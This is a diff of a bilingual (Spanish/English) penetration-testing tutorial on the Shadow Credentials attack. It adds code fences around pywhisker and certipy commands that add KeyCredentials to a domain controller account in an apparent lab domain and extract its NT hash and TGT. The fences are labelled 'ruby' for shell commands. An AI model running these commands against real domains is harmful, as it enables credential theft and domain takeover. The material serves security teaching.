@@ -30,9 +30,15 @@ Desde sistemas de tipo UNIX, el atributo  **msDS-KeyCredentialLink** de un usu
 
 Puedes usar este repositorio para instalar pywhisker:
 
+# Instalación
+
+```ruby
 git clone https://github.com/ShutdownRepo/pywhisker.git
 
 python3 setup.py install
+```
+
+
 
 lista todas las  **KeyCredential IDs** y sus **tiempos de creacion** asociados con el objeto: **DC$**.
 
@@ -60,11 +66,16 @@ pywhisker -d "ignite.local" -u "krishna" -p "Password@1" --target "DC$" --action
 
 After you add the new key, rerun the list command to verify that the system successfully added it. This time, the output will show the newly created **KeyCredential ID**, along with its **creation time**, including the **Device ID** of the new key.
 
+
+```ruby
 pywhisker -d ignite.local -u "krishna" -p "Password@1" --target "DC$" --action "list"
+```
 
 Next, use the `pywhisker info` command to retrieve detailed information about the newly added KeyCredential linked to the **DC$ object**, identified by the **Device ID**.
 
+```ruby
 pywhisker -d "ignite.local" -u "krishna" -p "Password@1" --target "DC$" --action "info" --device-id e9c84cef-af24-9755-8ce3-67088fd3d280
+```
 
 **![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2SzOslWwkjT2bElfc2l3qTVQpH0DmDnAnSA2bhZCf9g7PhxV5ehNnFKSqh7lxKdZ3tUsZu3tcwat4JfBtdhdrRZ0vWR4IFvQD0de4ecS3WE3kPv_36xzqJmbG48icwm8zkDnu7LP9Yr7PvqHKXyIJjw-tgz8f-PqaInTaxAYK-1kaU-B-ZcrXKb1e-AP6/s16000/10.png)**
 
@@ -100,7 +111,9 @@ As an alternative, [**Certipy**](https://github.com/ly4k/Certipy) can automate
 
 Certipy’s shadow command has an auto action, which will add a new Key Credential to the target account, authenticate with the Key Credential to retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential attribute.
 
+```ruby
 certipy-ad shadow auto -u krishna@ignite.local -p Password@1 -account dc$
+```
 
 ![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEit3TZGvCE9qFoUPERC8UusyDnJRw8VtW2KsJePGhSrk9qeN6jRCj0rskkpXWoOsbxMn1W9HivtGKDz1Gj5qwqXms0y_VBLE49dqBj6i4O8_CKa3x53sHs4xBjfuABsubI94ffHVzVQLF9aezz0jo2wis8zeCUfzFZqUVZJH33gbYquUEwxfXRE6JaaKptC/s16000/20.png)
 
